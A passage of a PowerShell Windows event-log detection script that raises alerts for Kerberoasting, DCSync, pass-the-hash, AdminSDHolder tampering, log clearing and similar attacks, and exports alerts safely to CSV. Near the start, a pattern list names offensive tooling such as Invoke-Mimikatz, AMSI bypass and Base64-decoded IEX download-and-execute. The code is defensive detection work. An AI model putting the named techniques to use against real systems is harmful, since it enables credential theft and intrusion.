      # Requires: GPO "Turn on PowerShell Script Block Logging" enabled.
      # Matches known offensive strings in script block text (truncated for storage).
      $scriptText = "$($f.scriptBlockText)"
      if (-not $scriptText) { break }

      $text = $scriptText.ToLower()
      $isMalicious = $false
      $matchedPattern = ''

      if ($text -match 'invoke-mimikatz') { $isMalicious = $true; $matchedPattern = 'Invoke-Mimikatz' }
      elseif ($text -match 'dumpcreds') { $isMalicious = $true; $matchedPattern = 'DumpCreds' }
      elseif ($text -match 'invoke-kerberoast') { $isMalicious = $true; $matchedPattern = 'Invoke-Kerberoast' }
      elseif ($text -match 'frombase64string.*iex') { $isMalicious = $true; $matchedPattern = 'FromBase64String + IEX' }
      elseif ($text -match 'amsiutils') { $isMalicious = $true; $matchedPattern = 'AmsiUtils (AMSI bypass)' }
      elseif ($text -match 'invoke-obfuscation') { $isMalicious = $true; $matchedPattern = 'Invoke-Obfuscation' }
      elseif ($text -match 'invoke-expression.*obfuscat') { $isMalicious = $true; $matchedPattern = 'Invoke-Expression with obfuscation' }
      elseif ($text -match '\bIEX\s*\(.*FromBase64String') { $isMalicious = $true; $matchedPattern = 'IEX(FromBase64String)' }
      elseif ($text -match 'system\.net\.webclient.*downloadstring') { $isMalicious = $true; $matchedPattern = 'WebClient.DownloadString' }
      elseif ($text -match 'start-process.*-windowstyle\s*hidden') { $isMalicious = $true; $matchedPattern = 'Start-Process -WindowStyle Hidden' }

      if ($isMalicious) {
        $account = "$($f.accountName)"
        $subject = "$($f.subjectUserName)"
        $hostName = "$($f.hostname)"

        # Skip system accounts
        if (Test-SystemAccount $subject) { break }

        # Truncate stored script text to 500 chars for safety
        $storedText = if ($scriptText.Length -gt 500) { $scriptText.Substring(0, 500) + '... [truncated]' } else { $scriptText }

        $desc = "PowerShell script block by `"$subject`" on `"$hostName`" matched offensive pattern: $matchedPattern. Script: $storedText"
        $ent = "$account|$matchedPattern"
        if (-not (Should-Dedupe 'powershell_scriptblock' $ent)) {
          return New-Alert 'powershell_scriptblock' $desc $null $f (Get-DedupeKey 'powershell_scriptblock' $ent) $evtTime
        }
      }
    }

    # ---- Privilege escalation / identity abuse -----------------------------
    { $_ -in 4728, 4732, 4756 } {
      if (Test-PrivilegedGroup $f.targetGroup) {
        $who = if ($f.memberName) { $f.memberName } else { $f.accountName }
        $by = if ($f.subjectUserName) { " by `"$($f.subjectUserName)`"" } else { "" }
        # deduped per ADDED ACCOUNT: one Domain Admins add must not swallow the
        # next one, which is what a rule-level dedupe key did
        if (-not (Should-Dedupe 'privilege_escalation' $who)) {
          return New-Alert 'privilege_escalation' "Account `"$who`" was added to privileged group `"$($f.targetGroup)`"$by." $null $f (Get-DedupeKey 'privilege_escalation' $who) $evtTime
        }
      }
    }

    { $_ -in 4729, 4733 } {
      if (Test-PrivilegedGroup $f.targetGroup) {
        $who = if ($f.memberName) { $f.memberName } else { $f.accountName }
        if (-not (Should-Dedupe 'group_membership_removed' $who)) {
          return New-Alert 'group_membership_removed' "Account `"$who`" was removed from privileged group `"$($f.targetGroup)`" by `"$($f.subjectUserName)`"." $null $f (Get-DedupeKey 'group_membership_removed' $who) $evtTime
        }
      }
    }

    4720 {
      $account = "$($f.accountName)"
      # skip computer accounts: they are created every time anything joins the
      # domain, which is what made this rule fire on routine provisioning
      if (-not (Test-MachineAccount $account)) {
        if (-not (Should-Dedupe 'account_created' $account)) {
          $by = if ($f.subjectUserName) { " by `"$($f.subjectUserName)`"" } else { "" }
          return New-Alert 'account_created' "New account `"$account`" was created$by." $null $f (Get-DedupeKey 'account_created' $account) $evtTime
        }
      }
    }

    4738 {
      # Compare WHAT CHANGED (new AND NOT old). The old code tested the new
      # flags alone, so editing an account that ALREADY had PASSWD_NOTREQD, or
      # any edit to an already-disabled account, fired a High/Critical alert.
      $oldFlags = ConvertTo-UacFlags "$($f.oldUserAccountControl)"
      $newFlags = ConvertTo-UacFlags "$($f.newUserAccountControl)"
      if ($null -ne $newFlags) {
        $gained = if ($null -ne $oldFlags) { $newFlags -band (-bnot $oldFlags) } else { $newFlags }
        $lost = if ($null -ne $oldFlags) { $oldFlags -band (-bnot $newFlags) } else { 0 }
        $problems = @()
        if (($gained -band 0x400000) -ne 0) { $problems += 'Kerberos pre-authentication is no longer required (AS-REP roastable)' }
        if (($gained -band 0x0020) -ne 0) { $problems += 'a password is no longer required' }
        if (($gained -band 0x80000) -ne 0) { $problems += 'unconstrained Kerberos delegation was granted (TGTs are forwarded to this account, so it can impersonate any user to any service)' }
        if (($gained -band 0x1000000) -ne 0) { $problems += 'constrained delegation with protocol transition was granted (it can obtain a service ticket for any user to the services it may delegate to)' }
        if (($lost -band 0x0002) -ne 0) { $problems += 'the account was re-enabled' }
        if ($problems.Count -gt 0) {
          $sev = if (($gained -band 0x400000) -ne 0) { 'Critical' } else { 'High' }
          $account = "$($f.accountName)"
          $desc = "Account `"$account`" was changed by `"$($f.subjectUserName)`" - $($problems -join '; ')."
          if (-not (Should-Dedupe 'account_control_changed' $account $sev $desc)) {
            return New-Alert 'account_control_changed' $desc $sev $f (Get-DedupeKey 'account_control_changed' $account) $evtTime
          }
        }
      }
    }

    4722 {
      $account = "$($f.accountName)"
      if (-not (Test-MachineAccount $account) -and -not (Should-Dedupe 'account_enabled_disabled' $account)) {
        return New-Alert 'account_enabled_disabled' "Account `"$account`" was enabled by `"$($f.subjectUserName)`"." $null $f (Get-DedupeKey 'account_enabled_disabled' $account) $evtTime
      }
    }

    4725 {
      $account = "$($f.accountName)"
      if (-not (Test-MachineAccount $account) -and -not (Should-Dedupe 'account_enabled_disabled' $account)) {
        return New-Alert 'account_enabled_disabled' "Account `"$account`" was disabled by `"$($f.subjectUserName)`"." $null $f (Get-DedupeKey 'account_enabled_disabled' $account) $evtTime
      }
    }

    4724 {
      $account = "$($f.accountName)"
      if (-not (Should-Dedupe 'password_reset_by_admin' $account)) {
        return New-Alert 'password_reset_by_admin' "Administrator `"$($f.subjectUserName)`" reset the password for account `"$account`"." $null $f (Get-DedupeKey 'password_reset_by_admin' $account) $evtTime
      }
    }

    4726 {
      $account = "$($f.accountName)"
      if (-not (Should-Dedupe 'account_deleted' $account)) {
        return New-Alert 'account_deleted' "Account `"$account`" was deleted by `"$($f.subjectUserName)`"." $null $f (Get-DedupeKey 'account_deleted' $account) $evtTime
      }
    }

    4794 {
      # 4794: DSRM Password Set - Critical on a DC.
      # The Directory Services Restore Mode (DSRM) password was changed on a Domain Controller.
      # This is always Critical - indicates potential compromise (attackers may boot into DSRM
      # and extract NTDS.dit with a known password).
      $account = "$($f.accountName)"
      $subject = "$($f.subjectUserName)"
      $dsrmChanged = $true  # always true for 4794

      # Skip if subject is a machine account
      if (Test-MachineAccount $subject) { break }

      # Always report as Critical
      $sev = 'Critical'
      $desc = "DSRM password was changed on Domain Controller `"$account`" by `"$subject`" - this is a critical compromise indicator."
      $ent = "$account|$subject"
      if (-not (Should-Dedupe 'dsrm_password_set' $ent $sev $desc)) {
        return New-Alert 'dsrm_password_set' $desc $sev $f (Get-DedupeKey 'dsrm_password_set' $ent) $evtTime
      }
    }

    5136 {
      # 5136: Directory Service Changes...
      # changes, and sIDHistory abuse. Key fields: ObjectClass, ObjectType (GUID),
      # AttributeLDAPDisplayName, AttributeValue.
      $objClass = "$($f.objectClass)"
      $attrName = "$($f.attributeLDAPDisplayName)"
      $attrValue = "$($f.attributeValue)"
      $subject = "$($f.subjectUserName)"
      $account = "$($f.accountName)"

      # Skip machine accounts
      if (Test-MachineAccount $subject -or Test-MachineAccount $account) { break }

      $isCritical = $false
      $desc = ""

      if ($objClass -ieq 'groupPolicyContainer') {
        $desc = "Group Policy Object `"$($f.objectName)`" was modified by `"$subject`" (attribute: $attrName)."
      } elseif ($attrName -ieq 'gPLink') {
        $desc = "GPO link on `"$($f.objectName)`" was changed by `"$subject`" - potential GPO-based persistence or privilege escalation."
      } elseif ($attrName -ieq 'nTSecurityDescriptor' -and $f.objectName -match 'AdminSDHolder') {
        $isCritical = $true
        $desc = "AdminSDHolder nTSecurityDescriptor was modified by `"$subject`" - this controls the default security descriptor for all protected admin groups (SDProp). Backdoor ACLs may have been added."
      } elseif ($attrName -ieq 'sIDHistory') {
        $isCritical = $true
        $desc = "sIDHistory was modified on account `"$account`" by `"$subject`" - this is a Golden Ticket / SID History injection indicator."
      } else {
        break
      }

      $sev = if ($isCritical) { 'Critical' } else { 'High' }
      $ent = "$account|$attrName"
      if (-not (Should-Dedupe 'gpo_or_admin_object_modified' $ent $sev $desc)) {
        return New-Alert 'gpo_or_admin_object_modified' $desc $sev $f (Get-DedupeKey 'gpo_or_admin_object_modified' $ent) $evtTime
      }
    }

    # ---- Kerberos / directory ---------------------------------------------
    4769 {
      # 4769: TicketEncryptionType 0x17 (RC4-HMAC) on a SUCCESSFUL request for a
      # user-owned service principal is the Kerberoasting signal. Excluded:
      # failed requests, machine SPNs (HOST/PC01$), krbtgt, and requests coming
      # from machine accounts - all of which made the old rule fire on ordinary
      # domain traffic.
      $enc = "$($f.encryptionType)".ToLower()
      $svc = "$($f.serviceName)"
      $account = "$($f.accountName)"
      $status = "$($f.statusCode)"
      $isRc4 = ($enc -eq '0x17' -or $enc -eq '23')
      $isFailure = ($status -and $status -ne '0x0' -and $status -ne '0')
      if ($isRc4 -and -not $isFailure -and $svc -and -not (Test-MachineAccount $svc) -and $svc -notmatch '(?i)^krbtgt' -and -not (Test-MachineAccount $account)) {
        $hits = @(Add-WindowHit 'kerb' $account $svc 10 $evtTime)
        $distinctSpn = Get-DistinctCount $hits
        # A single RC4 service ticket is worth a look but is common enough
        # (legacy services) to sit at Medium; three or more distinct SPNs inside
        # the window is a kerberoasting sweep and escalates to High, upgrading
        # any open alert for this account in place.
        $sev = if ($distinctSpn -ge 3) { 'High' } else { 'Medium' }
        $desc = "Service ticket requested for `"$svc`" using weak RC4 encryption (0x17) - requesting account `"$account`"."
        if ($distinctSpn -gt 1) { $desc += " $distinctSpn distinct service principals requested in the last 10 minutes." }
        if (-not (Should-Dedupe 'kerberoasting' $account $sev $desc)) {
          return New-Alert 'kerberoasting' $desc $sev $f (Get-DedupeKey 'kerberoasting' $account) $evtTime
        }
      }
    }

    4768 {
      # PreAuthType 0 = this account does not require Kerberos pre-auth, so the
      # TGT comes back encrypted with the password hash. A SINGLE one is enough
      # - the old threshold of 3 hits on the same account missed a one-shot
      # roast, which is the normal case.
      $account = "$($f.accountName)"
      $status = "$($f.statusCode)"
      $ok = (-not $status) -or $status -eq '0x0' -or $status -eq '0'
      if ("$($f.preAuthType)" -eq '0' -and $ok -and $account -and -not (Test-MachineAccount $account)) {
        $hits = @(Add-WindowHit 'asrep' $account $account 10 $evtTime)
        $sev = if ($hits.Count -ge 5) { 'Critical' } else { 'High' }
        $desc = "TGT issued for account `"$account`" which does not require Kerberos pre-authentication (AS-REP roastable) - $($hits.Count) request(s) in 10 minutes."
        if (-not (Should-Dedupe 'asrep_roasting' $account $sev $desc)) {
          return New-Alert 'asrep_roasting' $desc $sev $f (Get-DedupeKey 'asrep_roasting' $account) $evtTime
        }
      }
    }

    { $_ -in 4662, 5141 } {
      # The replication GUIDs live in Properties, so search the whole record
      # (Properties + ObjectType + ObjectName) rather than ObjectType alone.
      $hay = ("$($f.properties) $($f.objectType) $($f.objectName)").ToLower()
      $hitGuid = $null
      foreach ($g in $ReplicationGuids) {
        if ($hay -match [regex]::Escape($g)) { $hitGuid = $g; break }
      }
      $subject = "$($f.subjectUserName)"
      if ($hitGuid) {
        # a domain controller replicates as its MACHINE account (DC01$) - that is
        # a DC doing its job, so it is neither DCSync nor enumation noise
        if (-not (Test-MachineAccount $subject)) {
          $maskNote = if ($f.accessMask) { " (access mask $($f.accessMask))" } else { "" }
          $desc = "Account `"$subject`" used directory replication rights (right $hitGuid$maskNote, object `"$($f.objectName)`") - DCSync credential dumping."
          if (-not (Should-Dedupe 'dcsync_replication' $subject)) {
            return New-Alert 'dcsync_replication' $desc $null $f (Get-DedupeKey 'dcsync_replication' $subject) $evtTime
          }
        }
      } else {
        # enumeration heuristic: many object reads by one principal
        $bucket = if ($f.sourceIp) { $f.sourceIp } else { $f.subjectUserName }
        $type = "$($f.objectType)"
        $typeOk = (-not $type) -or ($type -match '(?i)user|group|computer|domain|contact|organizational') -or ($type -match '^[0-9a-f-]{36}$')
        if ($bucket -and $typeOk -and -not (Test-MachineAccount $bucket)) {
          $hits = @(Add-WindowHit 'ldap' $bucket $f.objectName 5 $evtTime)
          if ($hits.Count -ge 25) {
            $desc = "$($hits.Count) directory object reads (e.g. `"$($f.objectName)`") by `"$bucket`" within 5 minutes - domain enumeration pattern."
            if (-not (Should-Dedupe 'ldap_recon' $bucket)) {
              return New-Alert 'ldap_recon' $desc $null $f (Get-DedupeKey 'ldap_recon' $bucket) $evtTime
            }
          }
        }
      }
    }

    # ---- Lateral movement / execution --------------------------------------
    4624 {
      $type = "$($f.logonType)"
      $account = "$($f.accountName)"
      $srcIp = "$($f.sourceIp)"
      # a NULL session: type 3 with no credentials at all - the ANONYMOUS LOGON
      # name, an empty target, or the anonymous SID S-1-5-7. Checked FIRST, so
      # an anonymous logon is never mistaken for a service or admin logon.
      if ($type -eq '3') {
        $anon = ($account -eq '' -or $account -eq 'ANONYMOUS LOGON' -or "$($f.targetUserSid)" -eq 'S-1-5-7')
        if ($anon -and $srcIp -and $srcIp -ne '-' -and $srcIp -ne '::1' -and $srcIp -ne '127.0.0.1') {
          # deduped per source IP per hour (DedupeMinutes = 60): printers,
          # scanners and monitoring boxes can be constant anonymous talkers
          if (-not (Should-Dedupe 'anonymous_smb_session' $srcIp)) {
            return New-Alert 'anonymous_smb_session' "A null (anonymous) SMB session from $srcIp - pre-auth enumeration (RID cycling, SID brute-forcing, null-session tooling) starts like this." $null $f (Get-DedupeKey 'anonymous_smb_session' $srcIp) $evtTime
          }
        }
      }

      # pass-the-hash: LogonType 9 (new credentials) OR LogonType 3 with NTLM and KeyLength=0
      # from a non-machine account to a non-localhost source
      $authPkg = "$($f.authenticationPackageName)"
      $keyLen  = "$($f.keyLength)"
      $isPassTheHash = (($type -eq '9') -or ($type -eq '3' -and $authPkg -ieq 'NTLM' -and $keyLen -eq '0'))
      if ($isPassTheHash -and $account -and -not (Test-MachineAccount $account) -and $srcIp -and $srcIp -ne '-' -and $srcIp -ne '::1' -and $srcIp -ne '127.0.0.1') {
        $ent = "$account|$srcIp"
        $desc = 'Pass-the-hash logon (type ' + $type + ') by "' + $account + '" from ' + $srcIp + ' - NTLM KeyLength=0 indicates credential reuse.'
        if (-not (Should-Dedupe 'pass_the_hash_logon' $ent)) {
          return New-Alert 'pass_the_hash_logon' $desc $null $f (Get-DedupeKey 'pass_the_hash_logon' $ent) $evtTime
        }
      }

      $isRdp = ($type -eq '10')
      # Type 3 (network) is how services, backups, SMB and management tooling
      # all log on. Reporting every one of those was the noise this rule caused,
      # so a type-3 logon is only interesting for a NON-service account holding
      # an admin-style name. RDP (type 10) is reported for any human account.
      $isNetworkAdmin = ($type -eq '3') -and -not (Test-ServiceLike $account) -and (Test-PrivilegedName $account)
      if (($isRdp -or $isNetworkAdmin) -and $account -and -not (Test-MachineAccount $account) -and -not (Test-SystemAccount $account)) {
        # deduped per account + source, so a second source is a second alert
        $ent = "$account|$srcIp"
        $sev = if ($isRdp -and -not (Test-ServiceLike $account) -and (Test-PrivilegedName $account)) { 'High' } else { 'Medium' }
        $kind = if ($isRdp) { 'Remote desktop' } else { 'Administrative network' }
        $desc = "$kind logon (type $type) by `"$account`" from $srcIp."
        if (-not (Should-Dedupe 'suspicious_remote_logon' $ent $sev $desc)) {
          return New-Alert 'suspicious_remote_logon' $desc $sev $f (Get-DedupeKey 'suspicious_remote_logon' $ent) $evtTime
        }
      }
    }

    4648 {
      if (Test-PrivilegedName $f.targetUserName) {
        $ent = "$($f.subjectUserName)|$($f.targetUserName)"
        if (-not (Should-Dedupe 'explicit_credential_logon' $ent)) {
          $extra = if ($f.processName) { " (process: $($f.processName))" } else { "" }
          $srv = if ($f.targetServerName) { " on $($f.targetServerName)" } else { "" }
          return New-Alert 'explicit_credential_logon' "Account `"$($f.subjectUserName)`" started a process using explicit credentials for `"$($f.targetUserName)`"$srv$extra." $null $f (Get-DedupeKey 'explicit_credential_logon' $ent) $evtTime
        }
      }
    }

    { $_ -in 4697, 7045 } {
      $path = if ($f.serviceBinaryPath) { $f.serviceBinaryPath } else { $f.imagePath }
      $suspicious = $path -and ($path -match "(?i)$SuspiciousServicePath")
      $sev = if ($suspicious) { 'High' } else { 'Medium' }
      $binNote = if ($path) { " (binary: $path)" } else { "" }
      $sevNote = if ($suspicious) { " with a suspicious binary path" } else { "" }
      $desc = "New service `"$($f.serviceName)`" installed$binNote$sevNote."
      $ent = "$($f.serviceName)"
      if (-not (Should-Dedupe 'service_abuse' $ent $sev $desc)) {
        return New-Alert 'service_abuse' $desc $sev $f (Get-DedupeKey 'service_abuse' $ent) $evtTime
      }
    }

    4698 {
      $ent = if ($f.taskName) { $f.taskName } else { $f.subjectUserName }
      if (-not (Should-Dedupe 'scheduled_task_created' $ent)) {
        $cmd = if ($f.commandLine) { " (command: $($f.commandLine))" } else { "" }
        return New-Alert 'scheduled_task_created' "Scheduled task `"$($f.taskName)`" was created by `"$($f.subjectUserName)`"$cmd." $null $f (Get-DedupeKey 'scheduled_task_created' $ent) $evtTime
      }
    }

    4657 {
      $key = if ($f.registryKey) { $f.registryKey } else { $f.objectName }
      if ($key -and ($key -match "(?i)$PersistenceRegistryKey")) {
        if (-not (Should-Dedupe 'registry_persistence' $key)) {
          $val = if ($f.registryValueName) { " (value: $($f.registryValueName))" } else { "" }
          return New-Alert 'registry_persistence' "Registry key `"$key`" was modified by `"$($f.subjectUserName)`"$val - autostart/persistence key." $null $f (Get-DedupeKey 'registry_persistence' $key) $evtTime
        }
      }
    }

    # ---- Privilege use ------------------------------------------------------
    4672 {
      $account = "$($f.accountName)"
      # SYSTEM / LOCAL SERVICE / NETWORK SERVICE take these privileges on every
      # boot; the rule exists to inventory administrative sessions
      if (-not (Test-SystemAccount $account) -and -not (Should-Dedupe 'special_privileges_assigned' $account $null $null)) {
        $privs = @("$($f.privilegeList)" -split '[\s,]+' | Where-Object { $_ })
        $sensitive = @($privs | Where-Object { $SensitivePrivileges -contains $_.ToLower() })
        $sev = if ($sensitive.Count -gt 0) { 'Medium' } else { 'Low' }
        $note = if ($sensitive.Count -gt 0) { ", including $($sensitive -join ', ')" } else { "" }
        $desc = "Logon by `"$account`" on $($f.hostname) was granted $($privs.Count) privilege(s)$note."
        return New-Alert 'special_privileges_assigned' $desc $sev $f (Get-DedupeKey 'special_privileges_assigned' $account) $evtTime
      }
    }

    # ---- Anti-forensics / defense evasion ----------------------------------
    1102 {
      if (-not (Should-Dedupe 'log_tampering' $null)) {
        return New-Alert 'log_tampering' "The Security event log was cleared on $($f.hostname)." $null $f (Get-DedupeKey 'log_tampering' $null) $evtTime
      }
    }

    4719 {
      $ent = "$($f.subcategory)"
      if (-not (Should-Dedupe 'audit_policy_changed' $ent)) {
        return New-Alert 'audit_policy_changed' "The system audit policy was changed on $($f.hostname) by `"$($f.subjectUserName)`" - audit subcategory `"$($f.subcategory)`"." $null $f (Get-DedupeKey 'audit_policy_changed' $ent) $evtTime
      }
    }

    1100 {
      if (-not (Should-Dedupe 'eventlog_service_stopped' $null)) {
        return New-Alert 'eventlog_service_stopped' "The Windows Event Log service stopped on $($f.hostname) - auditing is blind until it restarts." $null $f (Get-DedupeKey 'eventlog_service_stopped' $null) $evtTime
      }
    }

    { $_ -in 5001, 5010, 5012 } {
      if (-not (Should-Dedupe 'defender_disabled' $null)) {
        $label = switch ($id) { 5001 { 'real-time protection' } 5010 { 'on-access scanning' } default { 'antivirus scanning' } }
        return New-Alert 'defender_disabled' "Windows Defender $label was disabled on $($f.hostname)." $null $f (Get-DedupeKey 'defender_disabled' $null) $evtTime
      }
    }

    { $_ -in 4946, 4947, 4948, 4949 } {
      $ent = "$($f.ruleName)"
      if (-not (Should-Dedupe 'firewall_rule_modified' $ent)) {
        $action = switch ($id) { 4946 { 'added' } 4948 { 'deleted' } default { 'modified' } }
        return New-Alert 'firewall_rule_modified' "A Windows Firewall rule was $action on $($f.hostname) by `"$($f.subjectUserName)`" - rule `"$($f.ruleName)`"." $null $f (Get-DedupeKey 'firewall_rule_modified' $ent) $evtTime
      }
    }

    4950 {
      # A WHOLE PROFILE being turned off: SettingType EnableFirewall with value
      # 'No' (some builds write 'Enable Windows Firewall', the oldest write '0').
      # Every other 4950 setting change is informational and stays out - the
      # individual rule adds/changes are firewall_rule_modified's job.
      $type = "$($f.settingType)"
      $value = "$($f.settingValue)"
      $isEnableFirewall = ($type -eq 'EnableFirewall') -or ($type -eq 'Enable Windows Firewall')
      $isOff = ($value -eq 'No') -or ($value -eq '0') -or ($value -eq 'False')
      if ($isEnableFirewall -and $isOff) {
        if (-not (Should-Dedupe 'firewall_disabled' "$($f.profileChanged)")) {
          return New-Alert 'firewall_disabled' "The Windows Firewall '$($f.profileChanged)' profile was turned OFF on $($f.hostname) by `"$($f.subjectUserName)`" - the host is open for lateral movement." $null $f (Get-DedupeKey 'firewall_disabled' "$($f.profileChanged)") $evtTime
        }
      }
    }

    4616 {
      if (-not (Should-Dedupe 'system_time_changed' $null)) {
        $to = if ($f.newTime) { " to $($f.newTime)" } else { "" }
        return New-Alert 'system_time_changed' "The system time was changed on $($f.hostname) by `"$($f.subjectUserName)`"$to - breaks Kerberos and log correlation." $null $f (Get-DedupeKey 'system_time_changed' $null) $evtTime
      }
    }
  }
  return $null
}

# ============================================================
# ALERT STORE: history persistence, CSV export, coverage catalog
# ============================================================
function Save-History {
  try {
    # Check and rotate history file if it exceeds the max size
    Check-HistoryRotation
    
    # Severity / Title / Rule / EventId / SelfTest are written so the restore
    # path can put an in-place-UPGRADED alert back at the severity it reached
    # instead of the rule's default. This file is read back by the script, so it
    # is NOT formula-sanitised (that would corrupt the stored values).
    $Script:Alerts |
      Select-Object Id, Time, RuleKey, Rule, EventId, Severity, Title, Description, Host, Account, SourceIp, Status, Notes,
        @{ n = 'Acknowledged'; e = { if ($_.Acknowledged) { 'yes' } else { 'no' } } },
        @{ n = 'SelfTest'; e = { if ($_.SelfTest) { 'yes' } else { 'no' } } } |
      Export-Csv -Path $HistoryFile -NoTypeInformation -Force -Encoding UTF8
  } catch { }
}

# Rotate sentinel-history.csv if it exceeds HistoryMaxMB.
# Keeps open/unresolved alerts in the active file, archives resolved alerts to
# sentinel-history-<date>.csv.
function Check-HistoryRotation {
  if (-not (Test-Path $HistoryFile)) { return }
  $sizeMB = (Get-Item $HistoryFile).Length / 1MB
  if ($sizeMB -lt $HistoryMaxMB) { return }
  
  # Read all alerts from history
  $allRows = Import-Csv $HistoryFile
  if (-not $allRows) { return }
  
  # Separate open/unresolved alerts from resolved ones
  $openRows = @($allRows | Where-Object { $_.Status -ne 'Resolved' -and $_.Status -ne 'False Positive' })
  $resolvedRows = @($allRows | Where-Object { $_.Status -eq 'Resolved' -or $_.Status -eq 'False Positive' })
  
  if ($resolvedRows.Count -eq 0) { return } # nothing to archive
  
  # Archive resolved alerts
  $archiveDate = (Get-Date).ToString('yyyyMMdd')
  $archiveFile = if ($PSScriptRoot) {
    Join-Path $PSScriptRoot ("sentinel-history-" + $archiveDate + ".csv")
  } else {
    "sentinel-history-" + $archiveDate + ".csv"
  }
  
  $resolvedRows | Export-Csv -Path $archiveFile -NoTypeInformation -Force -Encoding UTF8
  
  # Keep only open alerts in the active history file
  $openRows | Export-Csv -Path $HistoryFile -NoTypeInformation -Force -Encoding UTF8
}

# CSV FORMULA INJECTION: the attacker picks their own usernames, service names,
# task names and source addresses, and those strings are written straight into
# the engagement CSV. In Excel/LibreOffice a cell starting with = + - @ (also
# tab / CR) is evaluated as a formula, which turns the report itself into the
# delivery vehicle. Prefix those cells with an apostrophe so they stay text.
# Applied to the EXPORT only - the history file must round-trip.
function Protect-CsvCell($value) {
  $s = "$value"
  if ($s -match '^[=+\-@\t\r]') { return "'" + $s }
  return $s
}

# $includeSelfTest = $false by default: self-test rows are demo/noise and must
# not land in the engagement report or inflate the counts.
function Export-AlertsCsv($path, $includeSelfTest = $false) {
  $rows = @($Script:Alerts | Where-Object { $includeSelfTest -or -not $_.SelfTest })
  $rows |
    Select-Object Id, Time, RuleKey, Severity,
      @{ n = 'Title'; e = { Protect-CsvCell $_.Title } },
      Mitre,
      @{ n = 'Account'; e = { Protect-CsvCell $_.Account } },
      @{ n = 'Host'; e = { Protect-CsvCell $_.Host } },
      @{ n = 'SourceIp'; e = { Protect-CsvCell $_.SourceIp } },
      EventId, Status,
      @{ n = 'Acknowledged'; e = { if ($_.Acknowledged) { 'yes' } else { 'no' } } },
      @{ n = 'SelfTest'; e = { if ($_.SelfTest) { 'yes' } else { 'no' } } },
      @{ n = 'Notes'; e = { Protect-CsvCell $_.Notes } },
      @{ n = 'Description'; e = { Protect-CsvCell $_.Description } } |
    Export-Csv -Path $path -NoTypeInformation -Force -Encoding UTF8
  return $rows.Count
}

# The rule catalog + per-rule fired counts - what the dashboard's Detection
# Coverage panel renders. Shape matches the web platform's GET /api/admin/rules.
# Which channels write each monitored event id (from $LogSources). A rule whose
# every channel is unavailable on this OS cannot be confirmed working - it is
# 'unverified: log not present', not blind and not ok.
function Get-ChannelForEventIds {
  $map = @{}
  foreach ($src in $LogSources) {
    foreach ($id in @($src.Ids)) {
      if (-not $map.ContainsKey([int]$id)) { $map[[int]$id] = @() }
      $map[[int]$id] += "$($src.Log)"
    }
  }
  return $map
}

function Get-RuleCatalog {
  $fired = @{}
  foreach ($a in $Script:Alerts) {
    if (-not $a.RuleKey) { continue }
    # self-test alerts are excluded from the fired counts: they are synthetic
    # demo rows and must not be presented as detection coverage
    if ($a.SelfTest) { continue }
    if (-not $fired.ContainsKey($a.RuleKey)) { $fired[$a.RuleKey] = @{ Count = 0; Last = $null } }
    $fired[$a.RuleKey].Count++
    if (-not $fired[$a.RuleKey].Last -or $a.Time -gt $fired[$a.RuleKey].Last) { $fired[$a.RuleKey].Last = $a.Time }
  }

  $chanMap = Get-ChannelForEventIds
  $list = @()
  foreach ($k in $RuleMeta.Keys) {
    $m = $RuleMeta[$k]
    $hit = $fired[$k]
    $audit = Get-RuleAuditState $k
    # every channel this family's events are written to; 'unavailable' means the
    # OS has no such log (marked by the poll loop)
    $chanState = 'ok'
    $ruleChannels = @()
    foreach ($eid in @($m.EventIds)) {
      $c = $chanMap[[int]$eid]
      if ($c) { $ruleChannels += @($c) }
    }
    $ruleChannels = @($ruleChannels | Select-Object -Unique)
    if ($ruleChannels.Count -gt 0 -and @($ruleChannels | Where-Object { $Script:ChannelUnavailable.ContainsKey($_) }).Count -eq $ruleChannels.Count) {
      $chanState = 'unavailable'
    }
    if ($chanState -eq 'unavailable') {
      # every channel that writes this family's events is absent from this OS:
      # nobody can confirm the family works, so it is unverified (not blind -
      # nothing is misconfigured - and not ok)
      $audit = [PSCustomObject]@{ state = 'unknown'; subcategory = $audit.subcategory; need = $audit.need
        detail = 'log not present on this OS - skipped, so this family is unverified rather than blind' }
    }
    $list += [PSCustomObject]@{
      key           = $k
      title         = $m.Title
      severity      = $m.Severity
      mitre         = $m.Mitre
      category      = $m.Category
      eventIds      = @($m.EventIds)
      dedupeMinutes = $m.DedupeMinutes
      description   = $m.Description
      remediation   = $m.Remediation
      fired         = if ($hit) { $hit.Count } else { 0 }
      lastFiredAt   = if ($hit) { $hit.Last } else { $null }
      # audit-policy preflight: whether this family CAN fire at all
      auditState       = $audit.state
      auditSubcategory = $audit.subcategory
      auditRequired    = $audit.need
      auditDetail      = $audit.detail
    }
  }
  return $list
}

# ============================================================
# AUDIT-POLICY PREFLIGHT - can each rule family actually fire?
# ============================================================
# A detection is only as good as the audit policy underneath it: an event whose
# Advanced Audit subcategory is "No Auditing" is NEVER WRITTEN, so the rule is
# blind no matter how correct its logic is. This is the most common reason a
# detection "never fires" on a freshly built lab DC, and it is silent.
#
# auditpol /get /category:* prints one subcategory per line:
#     Logon                                  Success and Failure
# which is parsed into a lookup and compared with $RuleAudit.
function Get-AuditPolicyState {
  $state = @{}
  try {
    $raw = & auditpol.exe /get /category:* 2>$null
    foreach ($line in @($raw)) {
      if ("$line" -match '^\s+(?<name>\S.*?)\s{2,}(?<setting>No Auditing|Success and Failure|Success|Failure)\s*$') {
        $state[$Matches['name'].Trim().ToLower()] = $Matches['setting'].Trim()
      }
    }
  } catch { }
  return $state
}

# Re-read the live policy. $Script:AuditState = $null means "could not read it"
# (not elevated, or not Windows) - callers must report 'unknown', never 'blind',
# so the tool does not cry wolf when it simply cannot see the policy.
function Update-AuditPreflight {
  $state = Get-AuditPolicyState
  if ($state.Count -gt 0) { $Script:AuditState = $state } else { $Script:AuditState = $null }
  $Script:AuditCheckedAt = (Get-Date).ToUniversalTime().ToString("o")
  return $Script:AuditState
}

# ok      = the subcategory carries the Success/Failure half this rule needs
# blind   = the events this rule reads are not being written at all
# n/a     = not gated by an audit-policy subcategory (Eventlog service writes
#           1100/1102 itself; Defender's events live in its own channel)
# unknown = auditpol could not be read
function Get-RuleAuditState($ruleKey) {
  $map = $RuleAudit[$ruleKey]
  if (-not $map -or -not $map.Sub) {
    return [PSCustomObject]@{ state = 'n/a'; subcategory = ''; need = ''; detail = 'not gated by an audit-policy subcategory' }
  }
  $need = "$($map.Need)"
  $subs = @($map.Sub)
  if ($null -eq $Script:AuditState) {
    return [PSCustomObject]@{ state = 'unknown'; subcategory = ($subs -join ' + '); need = $need; detail = 'audit policy could not be read - run as Administrator to check coverage' }
  }
  $blind = @()
  $seen = @()
  foreach ($s in $subs) {
